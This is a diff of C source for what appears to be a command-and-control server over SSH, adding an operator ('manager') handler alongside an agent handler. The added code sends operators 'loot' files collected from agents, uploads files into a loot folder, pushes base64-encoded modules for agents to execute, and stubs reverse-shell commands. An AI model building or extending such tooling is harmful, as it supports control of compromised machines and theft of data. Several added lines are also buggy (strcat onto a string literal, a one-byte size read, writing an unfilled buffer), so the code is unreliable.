@@ -200,6 +200,184 @@ static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
 #endif /* HAVE_ARGP_H */
 
 
+void manager_handler(struct clientNode *node){
+    clientDat *manager = node->data;
+    char resp[2048];
+
+    int operation;
+    int rc = 0;
+    int quitting = 0;
+    int size = 0;
+    int size_e = 0;
+    char *ptr = NULL;
+    char *dat_ptr = NULL;
+    char buff[2048];
+    char tmpbuffer[8];
+    char filename[2048];
+    FILE *file;
+
+    while (!quitting)
+    {
+        ptr = resp;
+        operation = -1;
+        rc = 0;
+        size = 0;
+        size_e = 0;
+        file = NULL;
+        dat_ptr = NULL;
+        memset(buff, 0, 2048);
+        memset(tmpbuffer, 0, 8);
+        memset(filename, 0, 2048);
+        
+        rc = ssh_channel_read(manager->chan, resp, sizeof(resp), 0);
+        if (rc == SSH_ERROR)
+        {
+            printf("Manager %s: Failed to handle agent: %s\n", manager->id, ssh_get_error(manager->session));
+            return;
+        }
+        
+        // this seems wrong...
+        char tmpbf[3] = {0,0,0};
+        strncat(tmpbf,resp,2);
+        operation = atoi(tmpbf);
+        ptr += 2;
+        
+        /*
+        Command data structure:
+            First char: 
+                Describes what command it is
+            Following chars:
+                Optional values, separated by ',' chars
+            Terminating sequence:   
+                NULL
+        */
+
+        printf("Manager %s: Operation caught: %d\n", manager->id, operation);
+        switch (operation)
+        {
+        case MANAG_EXIT:
+            printf("Manager exit caught\n");
+            pthread_mutex_lock(&session_lock);
+            remove_node(node);
+            pthread_mutex_unlock(&session_lock);
+            ssh_channel_close(manager->chan);
+            ssh_free(manager->session);
+            printf("Manager %s: Client exiting...\n", manager->id); 
+            quitting = 1;
+            break;
+
+        case MANAG_GET_LOOT:
+            
+            printf("Manager %s: Sending file -> %s\n", manager->id, ptr);
+            memset(buff, 0, sizeof(buff));
+            tmpbuffer[7] = '\0';
+            
+            // get filesize 
+            size = get_file(ptr, &dat_ptr);
+            
+            if(size < 0){
+                printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
+                ssh_channel_write(manager->chan, "er", 3);
+                break;
+            }
+            memset(buff, 0, sizeof(buff));
+            size_e = b64_encoded_size(size);
+            sprintf(tmpbuffer, "%d", size_e);
+            
+            // writes file size
+            ssh_channel_write(manager->chan, tmpbuffer, sizeof(tmpbuffer));
+            ssh_channel_read(manager->chan, buff, sizeof(buff), 0);
+            
+            ptr = b64_encode((unsigned char *)dat_ptr, size);
+            
+            // writes file 
+            rc = ssh_channel_write(manager->chan, ptr, size_e);
+            if(rc == SSH_ERROR){
+                printf("Tada you found it: %s\n", ssh_get_error(manager->session));
+            }
+            printf("Manager %s: Sent file successfully\n", manager->id);
+
+            break;
+
+        case MANAG_UP_FILE:
+            printf("Manager upload caught\n");
+            /*ADD CHECKS IN HERE FOR SAFETY*/
+            
+            // gets file name
+            ssh_channel_write(manager->chan, "fn", 3);
+            ssh_channel_read(manager->chan, filename, sizeof(filename), 0);
+            
+            // get size and allocate memory segment
+            ssh_channel_write(manager->chan, "ok", 3);
+            ssh_channel_read(manager->chan, (char *) &size, 1, 0);
+            char *data_ptr = malloc(size);
+            memset(data_ptr, 0, size);
+            
+            // writes file size
+            ssh_channel_write(manager->chan, "ok", 3);
+            ssh_channel_read(manager->chan, buff, size, 0);
+
+            // writes file 
+            ssh_channel_write(manager->chan, "ok", 3);
+            clean_input(filename);
+            strcat("loot/", filename);
+            file = fopen(filename, "wb");
+            fwrite(data_ptr, 1, size, file);
+            fclose(file);
+            break;
+
+        case MANAG_REQ_RVSH:
+            printf("Manager shell command caught\n");
+            break;
+
+        case AGENT_REV_SHELL:
+            printf("Manager reverse shell caught\n");
+            break;
+
+        case MANAG_TASK_MODULE:
+            printf("Manager %s: Sending file -> %s\n", manager->id, ptr);
+            memset(buff, 0, sizeof(buff));
+            // TODO: ZERO OUT ALL BUFFERS HERE
+            // get filesize 
+            size = get_file(ptr, &dat_ptr);
+        
+            if(size < 0){
+                printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
+                ssh_channel_write(manager->chan, "er", 3);
+                break;
+            }
+            memset(buff, 0, 2048);
+            size_e = b64_encoded_size(size);
+            sprintf(tmpbuffer, "%d", size_e);
+        
+            // writes file size
+            ssh_channel_write(manager->chan, tmpbuffer, sizeof(tmpbuffer));
+            ssh_channel_read(manager->chan, buff, sizeof(buff), 0);
+        
+            ptr = b64_encode((unsigned char *)dat_ptr, size);
+        
+            // writes file 
+            rc = ssh_channel_write(manager->chan, ptr, size_e);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Failed to write data to channel: %s\n", manager->id, ssh_get_error(manager->session));
+            }
+            memset(tmpbuffer, 0, 8);
+
+            ssh_channel_read(manager->chan, tmpbuffer, 8, 0);
+
+            printf("Manager %s: Execution of module ended with exit code %s\n", manager->id, tmpbuffer);
+
+            break;
+
+        default:
+            printf("Manager %s: Unknown operation value '%d'\n", manager->id, operation); 
+            ssh_channel_write(manager->chan, "un", 3);
+            break;
+        }
+    }
+    
+}
+
 
 void agent_handler(struct clientNode *node){
     clientDat *agent = node->data;
@@ -254,7 +432,7 @@ void agent_handler(struct clientNode *node){
                 NULL
         */
 
-        printf("Client %S: Operation caught: %d\n", agent->id, operation);
+        printf("Client %s: Operation caught: %d\n", agent->id, operation);
 
         switch (operation)
         {
@@ -381,7 +559,7 @@ void agent_handler(struct clientNode *node){
 }
 
 
-void ssh_handler(void* sess){
+void client_handler(void* sess){
     struct clientNode *node = (struct clientNode*) sess;
     clientDat *pass = node->data;
     
@@ -390,6 +568,8 @@ void ssh_handler(void* sess){
     int msgType = REQ_NONE;
     char buf[4096];
     char agent_id[128];
+    char tmp_buffer[3];
+    memset(tmp_buffer, 0, 3);
     
     do {
 		//printf("entered message loop\n");
@@ -428,15 +608,6 @@ void ssh_handler(void* sess){
                 break;
         }
 
-		if (message && ssh_message_type(message) == SSH_REQUEST_CHANNEL && ssh_message_subtype(message) == SSH_CHANNEL_REQUEST_EXEC){
-			printf("Client %s: Got connection from manager\n", pass->id);
-            ssh_message_channel_request_reply_success(message);
-            sftp=1;
-            msgType = REQ_EXEC;
-			break;
-		}
-		
-
         if(!sftp){
             ssh_message_reply_default(message);
         }
@@ -452,32 +623,39 @@ void ssh_handler(void* sess){
     
     switch (msgType)
     {
-    case REQ_EXEC:
-        printf("Client %s: waiting for command\n", pass->id);
-        printf("Client %s: wrote data to channel\n", pass->id);
-        break;
     case REQ_TASKING:
-        ssh_channel_read(pass->chan, agent_id, sizeof(agent_id), 0);
-        printf("Client %s: got identifier: %s\n", pass->id, agent_id);
+        ssh_channel_read(pass->chan, tmp_buffer, 2, 0);
+        ssh_channel_write(pass->chan, "ok", 2);
+            
+        if(tmp_buffer[0] == '0'){
+            printf("Manager %s: Caught manager connection\n", pass->id);
 
-        // Check if ID exists
-        memset(buf, 0, sizeof(buf));
-        strcat(buf, "agents/");
-        int exists = directory_exists(strcat(buf, agent_id));
+            manager_handler(node);
+
+        } else {
+            ssh_channel_read(pass->chan, agent_id, sizeof(agent_id), 0);
+            printf("Client %s: got identifier: %s\n", pass->id, agent_id);
+
+            // Check if ID exists
+            memset(buf, 0, sizeof(buf));
+            strcat(buf, "agents/");
+            int exists = directory_exists(strcat(buf, agent_id));
         
-        if(!exists){
-            init_agent(agent_id);
-            printf("Client %s: Initialized agent\n", pass->id);
+            if(!exists){
+                init_agent(agent_id);
+                printf("Client %s: Initialized agent\n", pass->id);
+            }
+
+            char tasking[2048];
+            memset(tasking, 0, sizeof(tasking));
+            get_tasking(agent_id, tasking);
+            // Write tasking
+            ssh_channel_write(pass->chan, tasking, strlen(tasking));
+        
+            // Pass to handler
+            agent_handler(node);
+        
         }
-
-        char tasking[2048];
-        memset(tasking, 0, sizeof(tasking));
-        get_tasking(agent_id, tasking);
-        // Write tasking
-        ssh_channel_write(pass->chan, tasking, strlen(tasking));
-        
-        // Pass to handler
-        agent_handler(node);
         
         break;
     default:
@@ -558,7 +736,7 @@ void *handle_conn(void *input){
         add_node(node, current);
         pthread_mutex_unlock(&session_lock);
                 
-        ssh_handler(node);
+        client_handler(node);
     }
 
     return NULL;
